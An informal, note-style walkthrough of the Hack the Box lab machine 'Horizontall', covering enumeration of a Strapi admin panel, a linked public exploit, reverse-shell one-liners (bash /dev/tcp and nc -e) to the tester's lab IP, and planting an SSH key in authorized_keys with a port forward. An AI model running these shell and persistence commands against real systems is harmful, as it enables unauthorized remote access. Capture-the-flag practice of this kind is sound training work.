first 

lwlx@MacBook-Pro ~ % cat /etc/hosts           
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost

## Hack the Box

10.10.11.105	horizontal.htb api-prod.horizontal.htb


then

visit site
 find out about api
dirbuster api

/admin


 "strapiVersion":"3.0.0-beta.17.4"

https://www.exploit-db.com/exploits/50239



bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'
bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'

nc -nv 10.10.14.7 5555 -e /bin/bash


nice we got user easyily


now onto root


create ssh keys lwlx@lwlxs-MacBook-Pro Horizontall % ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/Users/lwlx/.ssh/id_rsa): key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:CKh51zHJOPHx4kPbFa9S64YxZHgHG69STvFo1Kb+Wuk lwlx@MacBook-Pro.F-Onlinev5
The key's randomart image is:
+---[RSA 3072]----+
|    . . =..      |
|   . = * Ooo     |
|  . + X @o* .    |
| o   * /.= o     |
|o . . B.S o      |
| . .   o.* .     |
|        ..=      |
|         +.      |
|        ..E      |
+----[SHA256]-----+


echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOUcZ+DBgyJt04hayFxopliJ3yCRe51Nz9T040OXjZIyWD3Kyg68mOcaEIOEHom0Kq+Ox7SvxlDqYupBj3DYAIu+VpXQglfMELxuG1XJxdjiZv7D6lmtCIFXJNPeGAfVzaxOtYWSioACnmzJGNh9zM76eSRzoWBO82S7CWqHyjjwO4GJ/QVwYUemWeBqUBNXHXTCA5XlTR1ujrpSkRkTavBZ7yQBy6Z52EwxuTpHfVLofkbdFbQHN1nhG6iWdebKq6wpCzdUkvsf+3ALw2fptrZ8B3EbXyrSyqvSS14/A619SYUcbYpdwYV+OAzXr2LRDE3a4QkbC9nIZy/xKcRlM3eoSMm6PDtfoaMKLgjGxIfzHVomApduNDSnTeNsbYLMLBTyxG70XyaHYJhvvjEfYADs7/fGe3AgY10JAP+HhKQNh5mcb12mhG4L6OzsY1iAKu0g0AtTPGb9TN55X1nYvkdyXZSbPoNRygcJ3YvGVHQcY7tfntdOx45Z1UO8bv2Bk= lwlx@MacBook-Pro.F-Onlinev5" > ~/.ssh/authorized_keys

save keys to accepted keys

connect:

ssh -i "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOUcZ+DBgyJt04hayFxopliJ3yCRe51Nz9T040OXjZIyWD3Kyg68mOcaEIOEHom0Kq+Ox7SvxlDqYupBj3DYAIu+VpXQglfMELxuG1XJxdjiZv7D6lmtCIFXJNPeGAfVzaxOtYWSioACnmzJGNh9zM76eSRzoWBO82S7CWqHyjjwO4GJ/QVwYUemWeBqUBNXHXTCA5XlTR1ujrpSkRkTavBZ7yQBy6Z52EwxuTpHfVLofkbdFbQHN1nhG6iWdebKq6wpCzdUkvsf+3ALw2fptrZ8B3EbXyrSyqvSS14/A619SYUcbYpdwYV+OAzXr2LRDE3a4QkbC9nIZy/xKcRlM3eoSMm6PDtfoaMKLgjGxIfzHVomApduNDSnTeNsbYLMLBTyxG70XyaHYJhvvjEfYADs7/fGe3AgY10JAP+HhKQNh5mcb12mhG4L6OzsY1iAKu0g0AtTPGb9TN55X1nYvkdyXZSbPoNRygcJ3YvGVHQcY7tfntdOx45Z1UO8bv2Bk= lwlx@MacBook-Pro.F-Onlinev5" -L 8000:127.0.0.1:8000 strapi@horizontall.htb

change your private key permission to 600 and hit this command

ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb